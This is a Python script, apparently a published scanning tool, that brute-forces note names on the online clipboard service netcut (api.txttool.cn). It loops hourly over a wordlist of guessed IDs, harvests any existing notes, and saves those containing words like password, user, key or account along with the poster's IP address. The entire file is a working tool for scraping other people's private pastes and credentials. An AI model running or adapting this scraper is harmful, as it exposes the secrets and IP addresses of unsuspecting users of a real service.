import requests, time, json, re, sys, os

requests.packages.urllib3.disable_warnings()

def logo():
    logo0 = r'''
 __    __              __       ______               __              ______                                
/  \  /  |            /  |     /      \             /  |            /      \                               
$$  \ $$ |  ______   _$$ |_   /$$$$$$  | __    __  _$$ |_          /$$$$$$  |  _______   ______   _______  
$$$  \$$ | /      \ / $$   |  $$ |  $$/ /  |  /  |/ $$   |  ______ $$ \__$$/  /       | /      \ /       \ 
$$$$  $$ |/$$$$$$  |$$$$$$/   $$ |      $$ |  $$ |$$$$$$/  /      |$$      \ /$$$$$$$/  $$$$$$  |$$$$$$$  |
$$ $$ $$ |$$    $$ |  $$ | __ $$ |   __ $$ |  $$ |  $$ | __$$$$$$/  $$$$$$  |$$ |       /    $$ |$$ |  $$ |
$$ |$$$$ |$$$$$$$$/   $$ |/  |$$ \__/  |$$ \__$$ |  $$ |/  |       /  \__$$ |$$ \_____ /$$$$$$$ |$$ |  $$ |
$$ | $$$ |$$       |  $$  $$/ $$    $$/ $$    $$/   $$  $$/        $$    $$/ $$       |$$    $$ |$$ |  $$ |
$$/   $$/  $$$$$$$/    $$$$/   $$$$$$/   $$$$$$/     $$$$/          $$$$$$/   $$$$$$$/  $$$$$$$/ $$/   $$/ 
                           [+] Version: 1.2     [+] Author: 曾哥(@AabyssZG)         
    '''
    print(logo0)

def read_clipboard_ids(file_path):
    """从dir.txt读取剪切板ID"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print("[-] dir.txt 文件未找到。")
        return []

def fetch_clipboard_content(clipboard_id):
    """通过POST请求获取指定剪切板 ID 的内容"""
    url = "https://api.txttool.cn/netcut/note/info/"
    data = "note_name=" + clipboard_id
    print("[.] 正在获取剪切板 " + clipboard_id + " 的内容")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
    }
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)
        if response.status_code == 200:
            try:
                return response.json()
            except ValueError:
                print(f"[-] 解析 {clipboard_id} 的 JSON 失败，返回内容：{response.text}")
        else:
            print(f"[-] 获取 {clipboard_id} 失败，状态码：{response.status_code}，返回内容：{response.text}")
    
    except requests.RequestException as e:
        print(f"[-] 请求剪切板 {clipboard_id} 失败：{e}")
    
    return None

def contains_sensitive_keywords(text):
    """检查文本是否包含 email 或 user 相关的关键词（不区分大小写）"""
    return bool(re.search(r"\b(email|file|user|pass|url|key|密码|账户|账号|测试|文件|文档|网盘)\b", text, re.IGNORECASE))

def save_content(clipboard_id, content):
    """保存剪切板内容到文件"""
    dir_name = "Find"
    os.makedirs(dir_name, exist_ok=True)  # 确保目录存在
    outfile_path = os.path.join(dir_name, f"{clipboard_id}.txt")
    idout_path = "ID_Out.txt"
    
    try:
        note_data = content.get("data", {})
        ip = note_data.get("log_list", [{}])[0].get("ip", "未知IP")
        updated_time = note_data.get("updated_time", "未知时间")
        note_content = note_data.get("note_content", "无内容")
        
        # 记录有内容的 ID
        with open(idout_path, 'a', encoding='utf-8') as id_file:
            id_file.write(f"{clipboard_id}\n")
        
         # 仅当内容包含关键词时保存
        if contains_sensitive_keywords(note_content):
            with open(outfile_path, 'a', encoding='utf-8') as f:
                f.write(f"IP:{ip}\nUpdatedTime:{updated_time}\nContent:{note_content}\n+--------+\n")
            print(f"[+] 发现关键词！已保存 {clipboard_id} 的内容到 {outfile_path}")
        else:
            print(f"[-] 剪切板 {clipboard_id} 的内容未包含指定关键词，跳过保存。")
    except Exception as e:
        print(f"[-] 保存 {clipboard_id} 内容时出错：{e}")

def main():
    logo()
    file_path = "dir.txt"
    interval = 3600  # 每隔 60 分钟获取一次
    print(f"[.] 读取 {file_path} 字典，准备开始爆破剪切板")
    while True:
        clipboard_ids = read_clipboard_ids(file_path)
        for clipboard_id in clipboard_ids:
            content = fetch_clipboard_content(clipboard_id)
            time.sleep(0.2)
            if content and content.get("status") == 1:
                print(f"[+] 成功获取剪切板 {clipboard_id} 内容")
                save_content(clipboard_id, content)
        print("[.] 等待下一次获取...")
        time.sleep(interval)

if __name__ == "__main__":
    main()
